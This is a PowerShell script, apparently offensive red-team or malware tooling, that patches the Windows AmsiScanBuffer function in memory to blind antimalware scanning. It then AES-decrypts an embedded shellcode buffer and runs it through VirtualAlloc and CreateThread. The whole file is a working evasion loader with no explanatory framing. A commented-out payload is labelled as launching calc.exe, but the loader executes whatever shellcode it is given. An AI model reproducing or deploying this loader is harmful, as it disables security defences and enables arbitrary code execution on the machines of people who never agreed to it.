function LookupFunc()
{
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp = @()
	$assem.GetMethods() | ForEach-Object { If ($_.Name -like "Ge*P*oc*ddress") { $tmp += $_ } }
	
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType()
{
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]]
		$func, [Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.
	DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
		[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
	DefineDynamicModule('InMemoryModule', $false).
	DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

	$type.
	DefineConstructor('RTSpecialName, HideBySig, Public',
		[System.Reflection.CallingConventions]::Standard, $func).
	SetImplementationFlags('Runtime, Managed')

	$type.
	DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
		$func). SetImplementationFlags('Runtime, Managed')
	return $type.CreateType()
}

### PATCH AMSI
function PatchAV()
{
	### DELEGATES
	$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
	
	$buf = [Byte[]] (0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3)
	$a = "A"
	$b = "msiS"
	$c = "canB"
	$d = "uffer"
	
	# get amsi.dll handle
	[IntPtr]$funcAddr = LookupFunc amsi.dll ($a + $b + $c + $d)
	# change protection
	$oldProtectionBuffer = 0
	$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
	# patch
	[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
	# restore protection
	$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
}

function DecryptBytesToBytes_Aes([byte[]] $EncryptedBufferWithIV, [byte[]] $AesKey)
{
    # Assuming the IV is prepended to the encrypted buffer
    $ivLength = 16 # AES IV size for AES-128, AES-192, AES-256
    $AesIV = New-Object byte[] $ivLength
    [Array]::Copy($EncryptedBufferWithIV, 0, $AesIV, 0, $ivLength)

    # The actual encrypted data starts after the IV
    $EncryptedBuffer = New-Object byte[] ($EncryptedBufferWithIV.Length - $ivLength)
    [Array]::Copy($EncryptedBufferWithIV, $ivLength, $EncryptedBuffer, 0, $EncryptedBuffer.Length)

    # Setup AES
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $AesKey
    $aes.IV = $AesIV
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

	$Encryptedms = New-Object System.IO.MemoryStream
	$Encryptedms.Write($EncryptedBuffer, 0, $EncryptedBuffer.Length)
	$Encryptedms.Position = 0 # Reset position to the beginning after writing


	$cryptoStreamModeRead = [System.Security.Cryptography.CryptoStreamMode]::Read
	$cs = New-Object System.Security.Cryptography.CryptoStream $Encryptedms, $decryptor, $cryptoStreamModeRead

    $Decryptedms = New-Object System.IO.MemoryStream
    $cs.CopyTo($Decryptedms)

    # Convert decrypted MemoryStream to a byte array
    return $Decryptedms.ToArray()
}


### Shellcode Runner
function RunShellcode()
{
	### DELEGATES
	$va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
	$ct = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
	$wfso = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int])))

	# Shellcode (calc.exe) (encrypted)
	#[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x0
	[Byte[]] $AesKey =  0x3C, 0x58, 0x82, 0x21, 0xF9, 0x75, 0x97, 0x05, 0x2E, 0xBE, 0xFB, 0xC3, 0x2D, 0xB6, 0xEC, 0x2B, 0x0F, 0x66, 0x89, 0xAA, 0x86, 0x4E, 0x79, 0x1D, 0xF1, 0x79, 0x55, 0x4D, 0xA9, 0x38, 0x2D, 0x46 
	[Byte[]] $AesIV =  0xEF, 0x74, 0x17, 0x21, 0x88, 0x50, 0xB1, 0x61, 0xF1, 0x05, 0xA7, 0x04, 0x68, 0x25, 0xD5, 0xB4 
	[Byte[]] $buf =  0xEF, 0x74, 0x17, 0x21, 0x88, 0x50, 0xB1, 0x61, 0xF1, 0x05, 0xA7, 0x04, 0x68, 0x25, 0xD5, 0xB4, 0x36, 0xF9, 0xDD, 0x37, 0x5A, 0x71, 0x70, 0x39, 0x83, 0xEE, 0x5C, 0x2C, 0x33, 0x7F, 0x5B, 0x7F, 0x33, 0x8D, 0x90, 0x40, 0x09, 0xBE, 0x2D, 0xFF, 0x8C, 0x2B, 0x05, 0x98, 0x45, 0x4F, 0x14, 0xC9, 0x7B, 0xDF, 0xF8, 0x73, 0x33, 0xE7, 0xB7, 0xCF, 0xCA, 0xB0, 0xE1, 0x77, 0xFD, 0xD7, 0x22, 0x04, 0xD5, 0x8E, 0xE6, 0x40, 0x7C, 0xD0, 0x6A, 0xA2, 0x06, 0xCD, 0xBE, 0xF8, 0x46, 0x1B, 0x9A, 0x93, 0x01, 0x10, 0x73, 0xCD, 0xFE, 0x01, 0xDC, 0x33, 0xBA, 0xB6, 0x9F, 0xD6, 0x1F, 0x18, 0xCF, 0xC8, 0x85, 0x21, 0x54, 0xFC, 0xBD, 0x01, 0x20, 0x66, 0x65, 0x92, 0xAC, 0xB3, 0x8B, 0x5F, 0xDC, 0x7D, 0xBC, 0x89, 0x8E, 0x8A, 0x56, 0xBE, 0x01, 0x58, 0xEF, 0xFC, 0x66, 0x02, 0x2B, 0x5E, 0xB0, 0x48, 0x21, 0x12, 0x9A, 0xDE, 0x0D, 0x54, 0xA5, 0x1D, 0x56, 0xA0, 0x50, 0x4C, 0x93, 0x2F, 0xCA, 0x16, 0x22, 0x57, 0x8F, 0x5A, 0xC9, 0x7B, 0x36, 0xF3, 0xC8, 0xFC, 0x04, 0xB1, 0x1C, 0x3B, 0x8C, 0x42, 0x14, 0x33, 0xA1, 0x67, 0x4A, 0x7C, 0x22, 0xDF, 0x96, 0xD9, 0x38, 0xB8, 0x92, 0x98, 0xA7, 0x94, 0xE5, 0xB0, 0x7E, 0x34, 0xBB, 0x6B, 0x76, 0x6A, 0xEC, 0x9E, 0x76, 0xAE, 0x16, 0x12, 0xAF, 0xA7, 0xE6, 0x10, 0x8A, 0x94, 0xDE, 0x24, 0x18, 0xB0, 0x82, 0xDC, 0xC8, 0x9C, 0x13, 0x94, 0xAC, 0xEF, 0xCE, 0x5C, 0x7D, 0x29, 0xDE, 0x7C, 0xE3, 0x97, 0x2F, 0x8C, 0x57, 0x6E, 0xCC, 0x83, 0xC9, 0x2C, 0x99, 0xDF, 0x0A, 0x49, 0xEA, 0x33, 0x18, 0xEA, 0xE0, 0x92, 0x0A, 0x66, 0x87, 0x50, 0x5F, 0x8B, 0x3A, 0x91, 0xF3, 0xA8, 0x50, 0x38, 0xE1, 0x57, 0x73, 0x3D, 0xB1, 0x52, 0xF6, 0x55, 0x36, 0xC6, 0x8C, 0xE1, 0x47, 0xC7, 0xDE, 0x95, 0x1D, 0xB9, 0x92, 0x8E, 0x03, 0x0C, 0x81, 0x39, 0xDA, 0x51, 0x3B, 0xBC, 0x69, 0x38, 0x14, 0x82, 0x15, 0x15, 0x0D, 0x2D, 0x92, 0xEC, 0x09, 0x5A, 0xE8, 0x8A, 0x8D, 0xA2, 0x5A, 0x28, 0x3B, 0xB7, 0xB8, 0xD4, 0x04, 0x67, 0x31, 0x31, 0xD2, 0xEF, 0x8F, 0xFA 

	# decrypt buf
	$buf = DecryptBytesToBytes_Aes $buf $AesKey
	[Uint32]$sBuf = $buf.Length

	# virtualalloc (RW)
	$pMemory = $va.Invoke([IntPtr]::Zero, $sBuf, 0x3000, 0x40);
	# copy shellcode
	[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $pMemory, $sBuf)
	# virtualprotect (RX)
	$oldProtectionBuffer = 0
	$vp.Invoke($pMemory, 3, 0x20, [ref]$oldProtectionBuffer)
	# createthread
	$hThread = $ct.Invoke([IntPtr]::Zero, 0, $pMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);
	# waitforsingleobject
	$wfso.Invoke($hThread, 0xFFFFFFFF);
}

### Execute
PatchAV
RunShellcode